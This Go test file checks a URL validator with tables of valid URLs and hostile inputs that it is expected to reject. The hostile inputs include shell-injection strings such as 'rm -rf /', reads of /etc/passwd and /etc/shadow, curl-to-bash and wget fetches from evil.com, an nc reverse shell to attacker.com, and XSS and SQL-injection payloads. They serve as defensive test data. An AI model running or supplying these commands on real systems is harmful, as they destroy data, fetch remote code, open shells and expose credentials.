package validation

import (
	"fmt"
	"testing"
)

func TestValidateURL(t *testing.T) {
	tests := []struct {
		name      string
		url       string
		expectErr bool
	}{
		// Valid URLs
		{
			name:      "valid http URL",
			url:       "http://localhost:8080",
			expectErr: false,
		},
		{
			name:      "valid https URL",
			url:       "https://example.com",
			expectErr: false,
		},
		{
			name:      "valid URL with port",
			url:       "http://127.0.0.1:3000",
			expectErr: false,
		},
		{
			name:      "valid URL with path",
			url:       "https://example.com/path/to/resource",
			expectErr: false,
		},
		{
			name:      "valid URL with query params",
			url:       "https://example.com?param=value",
			expectErr: false,
		},

		// Invalid schemes
		{
			name:      "javascript scheme",
			url:       "javascript:alert('xss')",
			expectErr: true,
		},
		{
			name:      "file scheme",
			url:       "file:///etc/passwd",
			expectErr: true,
		},
		{
			name:      "data scheme",
			url:       "data:text/html,<script>alert('xss')</script>",
			expectErr: true,
		},
		{
			name:      "ftp scheme",
			url:       "ftp://ftp.example.com",
			expectErr: true,
		},

		// Command injection attempts
		{
			name:      "semicolon injection",
			url:       "http://example.com; rm -rf /",
			expectErr: true,
		},
		{
			name:      "ampersand injection",
			url:       "http://example.com & cat /etc/passwd",
			expectErr: true,
		},
		{
			name:      "pipe injection",
			url:       "http://example.com | nc -l 1337",
			expectErr: true,
		},
		{
			name:      "backtick injection",
			url:       "http://example.com`whoami`",
			expectErr: true,
		},
		{
			name:      "dollar injection",
			url:       "http://example.com$(whoami)",
			expectErr: true,
		},
		{
			name:      "parentheses injection",
			url:       "http://example.com(echo test)",
			expectErr: true,
		},
		{
			name:      "redirect injection",
			url:       "http://example.com > /tmp/malicious",
			expectErr: true,
		},
		{
			name:      "quote injection single",
			url:       "http://example.com'",
			expectErr: true,
		},
		{
			name:      "quote injection double",
			url:       "http://example.com\"",
			expectErr: true,
		},
		{
			name:      "backslash injection",
			url:       "http://example.com\\",
			expectErr: true,
		},
		{
			name:      "newline injection",
			url:       "http://example.com\nrm -rf /",
			expectErr: true,
		},
		{
			name:      "carriage return injection",
			url:       "http://example.com\rrm -rf /",
			expectErr: true,
		},

		// Space injection
		{
			name:      "space injection",
			url:       "http://example.com rm -rf /",
			expectErr: true,
		},

		// Malformed URLs
		{
			name:      "malformed URL",
			url:       "not-a-url",
			expectErr: true,
		},
		{
			name:      "empty URL",
			url:       "",
			expectErr: true,
		},
		{
			name:      "URL without hostname",
			url:       "http://",
			expectErr: true,
		},
		{
			name:      "URL with only scheme",
			url:       "http:",
			expectErr: true,
		},

		// Edge cases
		{
			name:      "localhost",
			url:       "http://localhost",
			expectErr: false,
		},
		{
			name:      "IP address",
			url:       "http://192.168.1.1",
			expectErr: false,
		},
		{
			name:      "URL with fragment",
			url:       "https://example.com#section",
			expectErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateURL(tt.url)
			if tt.expectErr && err == nil {
				t.Errorf("ValidateURL(%q) expected error but got none", tt.url)
			}
			if !tt.expectErr && err != nil {
				t.Errorf("ValidateURL(%q) unexpected error: %v", tt.url, err)
			}
		})
	}
}

// TestValidateURL_SecurityFocus tests specific security-focused scenarios
func TestValidateURL_SecurityFocus(t *testing.T) {
	// Test various command injection patterns that might be attempted
	maliciousURLs := []string{
		"http://example.com; curl http://malicious.com/script.sh | bash",
		"http://example.com && wget http://evil.com/backdoor",
		"http://example.com || echo 'injected'",
		"http://example.com`nc -e /bin/sh attacker.com 4444`",
		"http://example.com$(curl evil.com)",
		"http://example.com > /dev/null; rm -rf /",
		"http://example.com < /etc/passwd",
		"http://example.com\\'; DROP TABLE users; --",
		"javascript:alert(document.cookie)",
		"data:text/html,<img src=x onerror=alert('XSS')>",
		"file:///etc/shadow",
		"ftp://anonymous@malicious.com",
	}

	for i, maliciousURL := range maliciousURLs {
		testName := "malicious_" + fmt.Sprintf("%d", i)
		t.Run(testName, func(t *testing.T) {
			err := ValidateURL(maliciousURL)
			if err == nil {
				t.Errorf("ValidateURL should reject malicious URL: %q", maliciousURL)
			}
		})
	}
}

// BenchmarkValidateURL benchmarks the URL validation function
func BenchmarkValidateURL(b *testing.B) {
	testURLs := []string{
		"http://localhost:8080",
		"https://example.com/path?param=value",
		"http://example.com; rm -rf /", // malicious
		"javascript:alert('xss')",      // malicious
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, url := range testURLs {
			_ = ValidateURL(url)
		}
	}
}